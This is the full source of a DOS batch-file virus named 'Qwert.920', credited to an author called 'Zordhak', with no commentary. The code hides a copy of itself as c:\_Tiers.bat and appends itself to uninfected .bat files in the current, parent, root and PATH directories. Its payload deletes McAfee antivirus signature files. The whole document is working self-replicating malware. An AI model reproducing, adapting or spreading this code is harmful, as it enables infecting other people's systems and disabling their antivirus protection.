:: Virus name: Qwert.920
:: Author: Zordhak
@echo off%_Tiers%
if '%1=='Tiers goto Tiers%2
set Tiers=%0.bat
if not exist %Tiers% set Tiers=%0
if '%Tiers%==' set Tiers=autoexec.bat
if exist c:\_Tiers.bat goto Tiers_go
if not exist %Tiers% goto evol_Tiers
find "Tiers"<%Tiers%>c:\_Tiers.bat
attrib c:\_Tiers.bat +h
:Tiers_go
if '%!Tiers%=='-- goto Tiers_exit
set !Tiers=%!Tiers%-
command /e:5000 /c c:\_Tiers Tiers v . .. \ %path%
:evol_Tiers
set Tiers=
goto Tiers_pay
:Tiersv
shift%_Tiers%
if '%2==' exit Tiers
for %%a in (%2\*.bat %2*.bat) do call c:\_Tiers Tiers inf %%a
goto Tiersv
:Tiers_inf
find "Tiers"<%3>nul
if not errorlevel 1 goto Tiers_jump
type %3>Tiers$
echo.>>Tiers$
type c:\_Tiers.bat>>Tiers$
move Tiers$ %3>nul
set Tiers!=%Tiers!%-
if %Tiers#%==-exit
:Tiers_jump
set Tiers!=%Tiers!%-
if %Tiers!%==-exit
:Tiers_pay


echo y| del c:\mcafee\*.dat
:: Tiers
:Tiers_exit
